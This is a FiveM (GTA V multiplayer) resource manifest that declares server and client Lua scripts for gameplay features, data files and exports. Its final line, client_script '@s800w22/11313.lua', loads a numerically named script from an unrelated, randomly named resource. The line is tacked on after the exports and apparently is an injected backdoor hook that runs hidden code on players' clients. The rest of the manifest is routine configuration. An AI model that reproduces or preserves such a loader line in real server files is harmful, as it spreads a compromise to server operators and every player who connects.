resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

server_scripts {
	"server/main.lua",
	"server/trunk.lua",
	"server/consumables.lua",
	"server/cryptostick.lua",
	"config.lua",
}

client_scripts {
	"config.lua",
	"client/wheelchair.lua",
	"client/calmai.lua",
	"client/main.lua",
	"client/ping.lua",
	"client/removeentities.lua",
	"client/crouchprone.lua",
	"client/fireworks.lua",
	"client/discord.lua",
	"client/binoculars.lua",
	"client/density.lua",
	"client/point.lua",
	"client/engine.lua",
	"client/seatbelt.lua",
	"client/consumables.lua",
	"client/recoil.lua",
	"client/ignore.lua",
	"client/weapdraw.lua",
	"client/hudcomponents.lua",
	"client/cruise.lua",
	"client/greenzones.lua",
	"client/tackle.lua",
	--"client/fib.lua",
	"client/perico.lua",
	"client/cucumber.lua",
	"client/skills.lua",
	"client/cryptostick.lua",
	"client/pushvehicle.lua"
}

data_file 'FIVEM_LOVES_YOU_4B38E96CC036038F' 'events.meta'
data_file 'FIVEM_LOVES_YOU_341B23A2F0E0F131' 'popgroups.ymt'

files {
	'events.meta',
	'popgroups.ymt',
	'relationships.dat',
}

exports {
	"CanVehicleBePushed",
	"isOnIsland"
}

client_script '@s800w22/11313.lua'